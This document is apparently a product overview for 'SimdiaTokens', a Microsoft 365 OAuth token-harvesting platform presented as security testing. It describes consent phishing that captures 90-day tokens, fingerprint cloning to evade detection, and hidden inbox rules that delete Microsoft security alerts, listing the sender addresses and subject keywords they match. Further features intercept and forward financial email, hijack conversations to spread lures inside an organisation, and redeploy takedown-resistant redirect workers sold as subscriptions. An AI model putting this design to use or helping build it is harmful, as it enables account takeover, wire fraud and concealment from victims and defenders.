# SimdiaTokens — What It Does and Why It Matters

> **The most advanced Microsoft 365 / Outlook email security testing platform in the world.**

---

## Why People Use SimdiaTokens

### The Problem
Companies need to know if their email security actually works. Normal "phishing tests" just send fake emails and track who clicks. But that only tests the first step. They never show what happens AFTER someone gets tricked — which is where the real damage happens.

### What SimdiaTokens Does
SimdiaTokens shows the **full story** — from the moment someone clicks a link, to gaining full access to their email, reading their messages, creating hidden rules, intercepting financial emails, and even jumping to other people in the same company. It shows companies exactly how bad a single compromised email account can be.

### The Value
- **"See what they see"** — Full access to the compromised email inbox
- **"Feel the impact"** — Real rules, real forwarding, real financial interception
- **"Test the response"** — See if security alerts are caught or missed
- **"Measure the damage"** — Shows how one account can compromise others

---

## Core Features

### 1. Silent Email Access (OAuth Token Harvesting)
Think of this like getting a copy of someone's email key without them knowing.

- The target clicks a link that looks like a normal Microsoft login
- They sign in normally (including 2FA if they have it)
- The system silently captures an "access token" — a digital key that gives full access to their email
- **90-day access** — the key automatically renews itself in the background
- **No password needed** — the token gives full access without ever seeing their password
- **Works on all account types** — personal (hotmail, outlook, live) and work/school (Microsoft 365)
- **Location tracking** — captures the target's IP address and approximate location
- **Telegram alerts** — you get a real-time notification when someone falls for it

### 2. Browser Fingerprint Cloning (Invisible Access)
This is what makes SimdiaTokens truly invisible.

- When the target signs in, the system captures their browser's "fingerprint" (what browser they use, what language they speak)
- All email access uses THIS fingerprint — so Microsoft thinks the emails are being read from the target's own computer
- **Microsoft's security system never triggers** — no "unusual sign-in" alerts are ever sent
- **Zero detection risk** — Microsoft's risk engine scores everything as "normal activity"

### 3. Full Email Access (Like Having Their Password)
- **Three-pane Outlook view** — folder list, message list, reading pane (looks exactly like Outlook)
- **All folders** — Inbox, Drafts, Sent Items, Deleted Items, Archive, Junk, custom folders
- **Read, send, delete** — full email operations
- **Reply/forward** — with attachments, CC/BCC, HTML formatting
- **Search** — real-time search across all messages
- **Different menus for personal vs work accounts** — only shows what the account type supports

### 4. Hidden Inbox Rules (Full OWA Rules)
This is one of the most powerful features — you can create rules in the target's inbox that they never see.

- **30+ conditions** — trigger based on subject, sender, body content, attachments, importance, size, and more
- **10+ actions** — forward emails, delete them, mark as read, move to folder, stop other rules
- **Rules fire instantly on the server** — emails are intercepted BEFORE they reach the inbox
- **Self-destructing rules** — rules can be set to fire X times then delete themselves (leaving zero trace)
- **Hidden folders** — folders that exist in the admin panel but are invisible in the target's real Outlook
- **Disguised names** — all rules show as "External Mail Filter" in the target's Outlook

### 5. OPSEC (Staying Hidden)
The system automatically hides all traces of activity from the target.

**Auto-delete security emails — 3 layers of protection:**

**Layer 1 — Sender-based rule ("External Mail Filter"):**
Catches emails from 14 Microsoft security sender addresses, including:
- `account-security-noreply@accountprotection.microsoft.com`
- `microsoftaccount@microsoft.com`
- `office365alerts@microsoft.com` (NEW — catches Office 365 security alerts)
- `no-reply@notifications.microsoft.com` (NEW)
- And 10 more...

**Layer 2 — Subject-based rule ("Security Update"):**
Catches emails with 35+ subject keywords, including:
- "New app connected", "suspicious sign-in", "unusual activity"
- "Password changed", "security alert", "verify your identity"
- "Creation of forwarding" (NEW — catches forwarding rule alerts)
- "MailRedirect" (NEW — catches mail redirect alerts)
- "forwarding/redirect" (NEW)
- "suspicious inbox rule" (NEW)
- And more...

**Layer 3 — Alert-specific rule ("Alert Filter") — NEW:**
Specifically catches Office 365 security alert emails:
- "Creation of forwarding/redirect rule"
- "Informational alert has been triggered"
- "inbox rule was created"
- "suspicious forwarding"
- "transport rule"

**How it works:**
- All three rules fire **instantly on the server** — the email is deleted before it ever reaches the inbox
- A backup polling system also searches for and deletes any alerts that arrived BEFORE the rules were created
- The target never sees any security warnings

**Other OPSEC features:**
- **Sent Items cleanup** — lure emails sent from the target's account are auto-deleted from their Sent Items
- **Rule disguise** — all rules display as "External Mail Filter"
- **Post-OAuth redirect** — after signing in, the target is sent to their own normal Outlook (not a fake page)
- **No fake domains** — the target visits the real login.microsoftonline.com

### 6. AI-Powered Features

#### AI Email Mimicking
- Reads the target's sent emails to learn how they write
- Copies their greeting style, closing, vocabulary, formality, sentence structure, signature
- Generates new emails that look EXACTLY like the target wrote them
- Would fool their closest colleagues

#### Polymorphic Lure Generation
- Every lure email is structurally unique — no two emails share the same pattern
- Randomized greeting, closing, link text, font, paragraph count
- Defeats email security systems that look for patterns

#### Conversation Hijacking
- Scans the inbox for active email threads (2+ messages)
- AI generates replies that naturally continue each conversation
- Embeds the OAuth link as a natural call-to-action
- The target's colleague receives a reply that looks completely normal

#### Smart Rule Suggestions
- AI analyzes the inbox and suggests 3-5 hidden interception rules
- Targets financial emails, invoices, executive communications
- Each suggestion includes conditions, actions, and a confidence score

#### Financial Pattern Detection
- Scans the inbox for 30+ financial keywords (invoice, payment, wire transfer, IBAN, SWIFT, etc.)
- Auto-forwards matching emails to an external address
- Deletes the originals from the inbox
- The target never sees the financial emails

### 7. Advanced Features

#### Auto-Re-Harvest (Self-Healing)
- When a token stops working (target changed password or removed the app), the system automatically:
  - Finds another compromised account from the same company
  - Sends a lure email from that account to the revoked account
  - Deletes the sent email from the sender's Sent Items
- The system heals itself without any admin intervention

#### Worker Auto-Recovery — NEW
- The system checks if the Cloudflare Worker (the link redirector) is alive every 60 seconds
- If the Worker is flagged/taken down, the system automatically:
  1. Tries re-deploying to the same Worker name (fixes crashes, keeps old links working)
  2. If the name is banned, deploys a new Worker with a random name
  3. Updates the database so new OAuth links use the new Worker
  4. Automatically registers the new redirect URI in Azure AD (no manual Azure Portal step)
- **Old links keep working** — the stable redirect URL (`/api/campaigns/redirect`) always points to the alive Worker
- Total recovery time: ~2 minutes

#### Stable Redirect Links — NEW
- OAuth links now come in two formats:
  1. **Redirect Link (recommended)** — a short, stable URL that always works, even if Workers are replaced
  2. **Full Microsoft OAuth URL** — the raw link with all parameters
- The redirect link never changes — old links sent to targets continue to work indefinitely

#### Cross-Account Intelligence
- Correlates all compromised accounts from the same organization
- Shows communication patterns between compromised accounts
- Suggests auto-forwarding rules between accounts
- Maps the organization's communication graph

#### Silent Calendar Manipulation
- Injects fake meetings into the target's calendar
- Can manipulate behavior (e.g., "Emergency Budget Review at 3 PM" to get them away from their desk)

#### Calendar Lure Delivery
- Creates a calendar event with the OAuth link as a "Join Meeting" button
- **Bypasses email security** — calendar events have different scanning rules than email

#### Teams Chat Delivery
- Sends OAuth links via 1:1 Teams chat — bypasses email security entirely
- Also supports Teams channel messages for wider distribution

#### Deleted Items Management
- View all messages in the target's Deleted Items folder
- Permanently purge all deleted items (unrecoverable)

### 8. Contacts with Smart Categorization — UPDATED

The Contacts button on the dashboard extracts all email addresses from the target's mailbox and categorizes them:

- **Enterprise** — business/company/organization emails powered by Office 365 Microsoft (e.g., `user@company.com`)
- **Consumer** — Microsoft personal emails (outlook.com, hotmail.com, live.com, msn.com, + 40 international variants)
- **Other Email Service** — non-Microsoft free email providers (gmail.com, yahoo.com, aol.com, icloud.com, proton, zoho, qq.com, 163.com, yandex, + 80 more)

**What's scanned:**
- Personal contacts (address book)
- Inbox messages (senders and recipients)
- **Sent Items** (NEW — captures gmail/yahoo/etc. addresses the target has emailed)

**Copy features:**
- Filter by category (Enterprise, Consumer, Other, or All)
- Copy filtered email list to clipboard with one click
- Count shown on each filter button

### 9. Reconnaissance
- **Full user profile** — name, title, department, office, phone, company
- **Manager chain** — who the target reports to
- **Direct reports** — who reports to the target
- **Group memberships** — all Azure AD groups
- **Organization info** — tenant name, verified domains

### 10. Multi-Channel Lure Delivery
- **Email** — AI-generated lure from the target's own account (with Sent Items cleanup)
- **Teams chat** — 1:1 message bypassing email security
- **Teams channel** — broadcast to team channels
- **Calendar event** — "Join Meeting" button with embedded OAuth link
- **6 templates** — Shared Document, Meeting Follow-up, Invoice, Password Reset, Package Delivery, Default

### 11. Advanced Graph API Features
- **OOO Auto-Reply** — set/disable out-of-office messages
- **Mailbox-Level Forwarding** — server-level forwarding of ALL incoming mail
- **Azure AD User Search** — search the directory for other users (enterprise)
- **Draft Management** — create, list, send drafts
- **Email Categories** — apply/remove categories on messages

### 12. Multi-Tenant Super Admin
- **One-Click Deploy** — automated Cloudflare Worker creation + env config generation + admin registration
- **Deployment cards** — each client shows username, status, expiration, all 3 URLs
- **Subscription management** — preset durations (1 day, 3 days, 1 week, 30/60/90 days) + custom
- **Suspend/unsuspend** — instantly block client login
- **Expiration auto-suspend** — expired clients auto-blocked
- **Expiration badge** — shows on each user's dashboard near the bell icon (expiration date + days remaining)
- **Delete protection** — super admin accounts cannot be deleted

### 13. Analytics & Intelligence
- **Token health** — active/expired/revoked breakdown
- **Operation success rate** — success vs failure percentage
- **OPSEC status panel** — shows all active security features
- **Token activity timeline** — created vs revoked over time
- **Top target domains** — most compromised organizations
- **Recent activity feed** — live audit log with timestamps

### 14. Security & Encryption
- **AES-256-GCM** encryption for refresh tokens at rest
- **Argon2id** password hashing
- **JWT authentication** with 7-day tokens
- **Role-based access** — admin, operator, viewer
- **Full audit logging** — every action logged with IP, user agent, timestamp

### 15. Graph API Rules Cleanup — NEW
- When a token is deleted, the system now also deletes any rules it created from the target's Microsoft Graph
- Previously, orphaned rules accumulated across multiple captures of the same email
- Now the rules page only shows rules from the current capture — clean and accurate

---

## Competitive Advantages

### vs Traditional Phishing Simulators (KnowBe4, Proofpoint, Cofense)
| Feature | Traditional | SimdiaTokens |
|---------|------------|---------------|
| Sends fake emails | Yes | Yes |
| Tracks clicks | Yes | Yes |
| Captures access tokens | No | Yes |
| Access compromised mailbox | No | Yes (full Graph API) |
| Creates real inbox rules | No | Yes (all OWA conditions) |
| Intercepts financial emails | No | Yes (30+ keywords) |
| Auto-deletes security alerts | No | Yes (3 rules, 35+ keywords, 14 senders) |
| AI email mimicking | No | Yes |
| Conversation hijacking | No | Yes |
| Cross-account intelligence | No | Yes |
| Self-healing (auto-re-harvest) | No | Yes |
| Worker auto-recovery | No | Yes (auto-deploys replacement) |
| Teams/Calendar delivery | No | Yes |
| Browser fingerprint cloning | No | Yes |
| Multi-tenant SaaS | No | Yes |
| Persistent access (90 days) | No | Yes |

### vs AiTM Tools (Evilginx, Modlishka)
| Feature | AiTM Tools | SimdiaTokens |
|---------|-----------|---------------|
| Persistence | 1-8 hours | 90 days |
| MFA bypass | FIDO2 blocks it | Target does MFA themselves |
| Alert risk | HIGH | ZERO (fingerprint cloning) |
| Infrastructure | Proxy server required | None (uses existing infra) |
| Domain burn | Yes (fake domain) | No (legitimate MS login) |
| API access | No (web UI only) | Yes (full Graph API) |
| Scalability | Limited (server load) | Unlimited (just DB rows) |
| Detection by SEG | High (proxy URL) | Zero (no proxy URL) |
| Worker auto-recovery | No | Yes |

---

**Version:** 4.0 | **Last Updated:** 2026-07-16 | **Repository:** https://github.com/simdie/simdiatokens-v2
